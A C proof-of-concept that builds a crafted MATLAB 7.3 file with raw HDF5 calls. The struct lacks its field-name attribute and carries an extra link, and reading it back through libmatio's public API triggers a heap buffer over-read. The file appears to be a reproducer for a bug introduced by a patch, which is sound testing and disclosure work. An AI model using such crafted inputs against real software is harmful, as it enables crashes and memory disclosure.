/*
 * PoC: heap-buffer-overflow while reading a MAT 7.3 struct that lacks the
 * MATLAB_fields attribute and whose HDF5 group contains a non-field link.
 *
 * Realistic entry point: a crafted .mat file is written to a temp path and
 * read back through the public API, Mat_Open() + Mat_VarRead().
 *
 * The crafted struct "s" holds two real fields ("a", "b") plus a child group
 * named "#refs#". When MATLAB_fields is absent, libmatio enumerates fields via
 * H5Literate, which skips the "#refs#" link, so the fieldnames array is sized
 * for 2 fields. The patched tree then iterates the field-processing loop using
 * the group's total link count (3), reading one element past the fieldnames
 * array -> ASan heap-buffer-overflow.
 *
 * On the parent tree the enumeration short-circuits after the first field, so
 * the loop bound matches the array and the read stays in bounds.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <hdf5.h>
#include <matio.h>

static void
add_class_attr(hid_t loc, const char *class_name)
{
    hid_t atype = H5Tcopy(H5T_C_S1);
    hid_t aspace;
    hid_t attr;
    H5Tset_size(atype, strlen(class_name));
    H5Tset_strpad(atype, H5T_STR_NULLTERM);
    aspace = H5Screate(H5S_SCALAR);
    attr = H5Acreate(loc, "MATLAB_class", atype, aspace, H5P_DEFAULT, H5P_DEFAULT);
    H5Awrite(attr, atype, class_name);
    H5Aclose(attr);
    H5Sclose(aspace);
    H5Tclose(atype);
}

static void
add_double_field(hid_t group, const char *name)
{
    hsize_t dims[2] = {1, 1};
    hid_t space = H5Screate_simple(2, dims, NULL);
    hid_t dset =
        H5Dcreate(group, name, H5T_IEEE_F64LE, space, H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT);
    double value = 1.0;
    H5Dwrite(dset, H5T_NATIVE_DOUBLE, H5S_ALL, H5S_ALL, H5P_DEFAULT, &value);
    add_class_attr(dset, "double");
    H5Dclose(dset);
    H5Sclose(space);
}

int
main(void)
{
    const char *path = "poc_nomatlabfields.mat";
    mat_t *mat;
    matvar_t *matvar;
    hid_t fid, sgroup, refs;

    /* Create a well-formed MAT 7.3 container (correct 512-byte userblock
     * header) using the public API, then close it. */
    mat = Mat_CreateVer(path, NULL, MAT_FT_MAT73);
    if ( NULL == mat ) {
        fprintf(stderr, "Mat_CreateVer failed\n");
        return 2;
    }
    Mat_Close(mat);

    /* Reopen with raw HDF5 and craft a struct group without MATLAB_fields.
     * The group holds two fields and one non-field link ("#refs#"). */
    fid = H5Fopen(path, H5F_ACC_RDWR, H5P_DEFAULT);
    if ( fid < 0 ) {
        fprintf(stderr, "H5Fopen failed\n");
        return 2;
    }
    sgroup = H5Gcreate(fid, "s", H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT);
    add_class_attr(sgroup, "struct");
    add_double_field(sgroup, "a");
    add_double_field(sgroup, "b");
    refs = H5Gcreate(sgroup, "#refs#", H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT);
    H5Gclose(refs);
    H5Gclose(sgroup);
    H5Fclose(fid);

    /* Read it back through the documented public entry points. */
    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( NULL == mat ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 2;
    }
    matvar = Mat_VarRead(mat, "s");
    if ( NULL != matvar ) {
        Mat_VarFree(matvar);
    }
    Mat_Close(mat);
    remove(path);
    return 0;
}
